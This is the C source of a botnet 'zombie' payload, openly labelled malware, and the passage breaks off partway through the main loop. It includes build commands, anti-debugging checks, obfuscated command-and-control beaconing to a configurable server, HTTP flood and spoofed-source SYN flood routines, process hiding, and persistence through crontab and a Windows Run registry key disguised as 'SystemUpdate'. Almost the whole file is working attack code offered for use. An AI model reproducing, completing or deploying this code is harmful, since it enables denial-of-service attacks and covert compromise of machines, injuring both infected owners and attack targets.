/*
 * NECRO-BOTNET Zombie Payload – CAT(c) 2026
 * Compile: gcc -O2 -s -static -o zombie zombie.c -lpthread -lcurl
 * Windows: x86_64-w64-mingw32-gcc -O2 -s -static -o zombie.exe zombie.c -lws2_32 -lwininet -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <curl/curl.h>

// ============ CONFIG ============
#define C2_SERVER "192.168.1.100"  // CHANGE THIS
#define C2_PORT 4444
#define BEACON_INTERVAL 10
#define ATTACK_THREADS 50

// ============ GLOBALS ============
volatile int attack_running = 0;
char attack_target[256] = {0};
char attack_method[32] = {0};
int attack_duration = 0;
time_t attack_start = 0;
unsigned long long packets_sent = 0;
unsigned long long bytes_sent = 0;

// ============ ANTI-ANALYSIS ============
int is_debugged() {
    #ifdef __linux__
    FILE *fp = fopen("/proc/self/status", "r");
    if (!fp) return 0;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "TracerPid:")) {
            int pid;
            sscanf(line, "TracerPid: %d", &pid);
            fclose(fp);
            return pid > 0;
        }
    }
    fclose(fp);
    #endif
    #ifdef _WIN32
    if (IsDebuggerPresent()) return 1;
    #endif
    return 0;
}

// ============ ENCRYPTION (XOR + Base64) ============
void xor_encrypt(unsigned char *data, int len, unsigned char *key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % 32];
    }
}

void base64_encode(const unsigned char *input, int len, char *output) {
    const char *table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0;
    unsigned char buf[3];
    while (len--) {
        buf[i++] = *(input++);
        if (i == 3) {
            output[j++] = table[buf[0] >> 2];
            output[j++] = table[((buf[0] & 0x03) << 4) | (buf[1] >> 4)];
            output[j++] = table[((buf[1] & 0x0F) << 2) | (buf[2] >> 6)];
            output[j++] = table[buf[2] & 0x3F];
            i = 0;
        }
    }
    if (i) {
        for (int k = i; k < 3; k++) buf[k] = 0;
        output[j++] = table[buf[0] >> 2];
        output[j++] = table[((buf[0] & 0x03) << 4) | (buf[1] >> 4)];
        output[j++] = (i == 1) ? '=' : table[((buf[1] & 0x0F) << 2) | (buf[2] >> 6)];
        output[j++] = '=';
    }
    output[j] = 0;
}

// ============ C2 COMMUNICATION ============
void send_heartbeat(int sock) {
    char msg[512];
    char b64[1024];
    unsigned char key[32] = "NECRO_BOTNET_2026_KEY";
    
    // Get system info
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    char os[64];
    #ifdef __linux__
    strcpy(os, "Linux");
    #else
    strcpy(os, "Windows");
    #endif
    
    snprintf(msg, sizeof(msg), "{\"type\":\"heartbeat\",\"id\":\"%s\",\"os\":\"%s\",\"power\":%d}", 
             hostname, os, ATTACK_THREADS);
    
    // Encrypt
    xor_encrypt((unsigned char*)msg, strlen(msg), key);
    base64_encode((unsigned char*)msg, strlen(msg), b64);
    
    send(sock, b64, strlen(b64), 0);
}

void recv_command(int sock) {
    char buffer[4096];
    int len = recv(sock, buffer, sizeof(buffer)-1, 0);
    if (len <= 0) return;
    buffer[len] = 0;
    
    // Decrypt
    unsigned char key[32] = "NECRO_BOTNET_2026_KEY";
    // Simple decryption (reverse of xor)
    for (int i = 0; i < len; i++) {
        buffer[i] ^= key[i % 32];
    }
    
    // Parse command (simple JSON)
    if (strstr(buffer, "\"type\":\"attack\"")) {
        char *target = strstr(buffer, "\"target\":\"");
        if (target) {
            target += 10;
            char *end = strstr(target, "\"");
            if (end) {
                *end = 0;
                strcpy(attack_target, target);
                attack_running = 1;
                attack_start = time(NULL);
                
                // Parse method
                char *method = strstr(buffer, "\"method\":\"");
                if (method) {
                    method += 10;
                    char *end2 = strstr(method, "\"");
                    if (end2) {
                        *end2 = 0;
                        strcpy(attack_method, method);
                    }
                }
                
                // Parse duration
                char *dur = strstr(buffer, "\"duration\":");
                if (dur) {
                    dur += 11;
                    attack_duration = atoi(dur);
                }
                
                printf("[*] Attack started on %s (%s)\n", attack_target, attack_method);
            }
        }
    } else if (strstr(buffer, "\"type\":\"idle\"")) {
        attack_running = 0;
        printf("[*] Attack stopped\n");
    }
}

// ============ ATTACK METHODS ============
void *http_flood(void *arg) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    
    char url[512];
    char random_path[64];
    struct curl_slist *headers = NULL;
    
    while (attack_running) {
        // Random path to bypass cache
        snprintf(random_path, sizeof(random_path), "/?%d", rand());
        snprintf(url, sizeof(url), "http://%s%s", attack_target, random_path);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1);
        curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        
        // Random headers
        headers = curl_slist_append(headers, "Accept: */*");
        headers = curl_slist_append(headers, "Cache-Control: no-cache");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        if (curl_easy_perform(curl) == CURLE_OK) {
            packets_sent++;
            bytes_sent += 512;
        }
        
        if (time(NULL) - attack_start > attack_duration) {
            attack_running = 0;
            break;
        }
    }
    
    curl_easy_cleanup(curl);
    return NULL;
}

void *syn_flood(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return NULL;
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    inet_pton(AF_INET, attack_target, &target.sin_addr);
    
    char packet[4096];
    struct iphdr *ip = (struct iphdr*)packet;
    struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    while (attack_running) {
        // Build IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = rand();
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = rand();  // spoofed source
        ip->daddr = target.sin_addr.s_addr;
        
        // TCP header
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(80);
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0;
        tcp->urg_ptr = 0;
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&target, sizeof(target));
        packets_sent++;
        bytes_sent += ip->tot_len;
        
        if (time(NULL) - attack_start > attack_duration) {
            attack_running = 0;
            break;
        }
    }
    
    close(sock);
    return NULL;
}

// ============ MAIN ZOMBIE LOOP ============
int main() {
    // Anti-analysis
    if (is_debugged()) exit(0);
    
    // Daemonize
    #ifdef __linux__
    if (fork() > 0) exit(0);
    setsid();
    #endif
    
    // Hide ourselves
    #ifdef __linux__
    signal(SIGSTOP, SIG_IGN);
    signal(SIGTSTP, SIG_IGN);
    #endif
    
    // Persistence
    char path[1024];
    #ifdef __linux__
    readlink("/proc/self/exe", path, sizeof(path));
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", path);
    system(cmd);
    #else
    GetModuleFileNameA(NULL, path, sizeof(path));
    char reg_cmd[512];
    snprintf(reg_cmd, sizeof(reg_cmd), "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /t REG_SZ /d \"%s\" /f", path);
    system(reg_cmd);
    #endif
    
    // Connect to C2
    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(10);
            continue;
        }
        
        struct sockaddr_in c2;
        c2.sin_family = AF_INET;
        c2.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_SERVER, &c2.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&c